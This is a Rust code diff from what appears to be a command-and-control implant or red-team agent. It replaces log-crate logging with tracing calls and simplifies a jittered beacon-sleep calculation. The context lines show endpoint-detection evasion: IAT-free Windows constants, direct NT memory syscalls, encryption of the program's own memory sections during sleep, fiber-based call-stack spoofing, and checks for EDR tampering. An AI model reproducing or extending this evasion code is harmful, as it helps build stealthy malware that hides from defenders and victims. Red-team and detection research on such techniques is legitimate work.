@@ -2,8 +2,8 @@ use anyhow::Result;
 use common::config::SleepConfig;
 #[cfg(windows)]
 use common::config::SleepMethod;
-use log::debug;
-use log::info;
+use tracing::debug;
+use tracing::info;
 use rand::{thread_rng, Rng, RngCore as _};
 
 // ── Windows IAT-free constants ────────────────────────────────────────────────
@@ -117,10 +117,7 @@ static NTDELAY_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64:
 static SWITCHTOFIBER_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
 
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
-    let mut base = config
-        .base_interval_ms
-        .map(|ms| ms as f64 / 1000.0)
-        .unwrap_or(config.base_interval_secs as f64);
+    let mut base = config.effective_base_interval_ms() as f64 / 1000.0;
     if let (Some(start), Some(end), Some(mult)) = (
         config.working_hours_start,
         config.working_hours_end,
@@ -379,7 +376,7 @@ pub mod crypto {
             0,
         );
         if ptr == libc::MAP_FAILED {
-            log::error!(
+            tracing::error!(
                 "alloc_key_page: mmap failed: {}",
                 std::io::Error::last_os_error()
             );
@@ -406,7 +403,7 @@ pub mod crypto {
             PAGE_READWRITE,
         );
         if status != 0 || base.is_null() {
-            log::error!(
+            tracing::error!(
                 "alloc_key_page: NtAllocateVirtualMemory failed (status={})",
                 status
             );
@@ -443,7 +440,7 @@ pub mod crypto {
                 MEM_RELEASE,
             );
             if status != 0 {
-                log::error!(
+                tracing::error!(
                     "free_key_page: NtFreeVirtualMemory failed (status={})",
                     status
                 );
@@ -473,7 +470,7 @@ pub mod crypto {
                 old_protect as *mut _ as usize as u64,
             );
             if status != 0 {
-                log::error!(
+                tracing::error!(
                     "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
                     addr,
                     size,
@@ -500,7 +497,7 @@ pub mod crypto {
                 old_protect,
             );
             if status != 0 {
-                log::error!(
+                tracing::error!(
                     "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
                     addr,
                     size,
@@ -523,7 +520,7 @@ pub mod crypto {
         let aligned = (addr as usize) & !(page_size - 1);
         let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
         if libc::mprotect(aligned as *mut libc::c_void, aligned_size, prot) != 0 {
-            log::error!(
+            tracing::error!(
                 "mprotect failed for {:p} (size={}): {}",
                 addr,
                 size,
@@ -737,7 +734,7 @@ pub mod crypto {
             // Allocate a separate page to hold the session key.
             let (kp, kplen) = alloc_key_page();
             if kp.is_null() {
-                log::error!("encrypt_sections: failed to allocate key page — aborting");
+                tracing::error!("encrypt_sections: failed to allocate key page — aborting");
                 return;
             }
 
@@ -847,7 +844,7 @@ pub mod crypto {
         #[cfg(not(feature = "memory-guard"))]
         unsafe {
             if !SESSION_INITIALIZED.with(|c| c.get()) {
-                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
+                tracing::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                 return;
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
@@ -896,7 +893,7 @@ pub mod crypto {
                             // Poly1305 tag verification FAILED — the encrypted
                             // section was tampered with during sleep.  Executing
                             // tampered code is unacceptable; terminate immediately.
-                            log::error!(
+                            tracing::error!(
                                 "decrypt_sections: Poly1305 tag verification FAILED for section at {:p} \
                                  — possible EDR tampering detected. Terminating process.",
                                 section.addr,
@@ -939,7 +936,7 @@ pub mod crypto {
             // included in the encryption pass.
             let (kp, kplen) = alloc_key_page();
             if kp.is_null() {
-                log::error!("encrypt_sections: failed to allocate key page — aborting");
+                tracing::error!("encrypt_sections: failed to allocate key page — aborting");
                 return;
             }
 
@@ -1040,7 +1037,7 @@ pub mod crypto {
     pub fn decrypt_sections() {
         unsafe {
             if !SESSION_INITIALIZED.with(|c| c.get()) {
-                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
+                tracing::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                 return;
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
@@ -1092,7 +1089,7 @@ pub mod crypto {
                             // Poly1305 tag verification FAILED — the encrypted
                             // section was tampered with during sleep.  Executing
                             // tampered code is unacceptable; terminate immediately.
-                            log::error!(
+                            tracing::error!(
                                 "decrypt_sections: Poly1305 tag verification FAILED for section at {:p} \
                                  — possible EDR tampering detected. Terminating process.",
                                 section.addr,
@@ -1341,7 +1338,7 @@ pub mod spoof {
             };
 
             if main_fiber.is_null() {
-                log::warn!("spoof_stack: ConvertThreadToFiber failed");
+                tracing::warn!("spoof_stack: ConvertThreadToFiber failed");
                 return false;
             }
 
@@ -1385,11 +1382,11 @@ pub mod spoof {
             };
 
             if sleep_fiber.is_null() {
-                log::warn!("spoof_stack: CreateFiber failed");
+                tracing::warn!("spoof_stack: CreateFiber failed");
                 return false;
             }
 
-            log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
+            tracing::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
             // Switch to the sleep fiber — the current thread's call stack is
             // now hidden.  The sleep fiber will call Sleep() and then
             // switch_to_fiber(main_fiber), which resumes execution right here.
@@ -1405,9 +1402,9 @@ pub mod spoof {
         // This function is a no-op since the fiber already returned control.
         let switched = LAST_SWITCH_SUCCEEDED.with(|c| c.replace(false));
         if switched {
-            log::debug!("restore_stack: resumed from sleep fiber");
+            tracing::debug!("restore_stack: resumed from sleep fiber");
         } else {
-            log::debug!("restore_stack: no fiber switch to restore");
+            tracing::debug!("restore_stack: no fiber switch to restore");
         }
         switched
     }
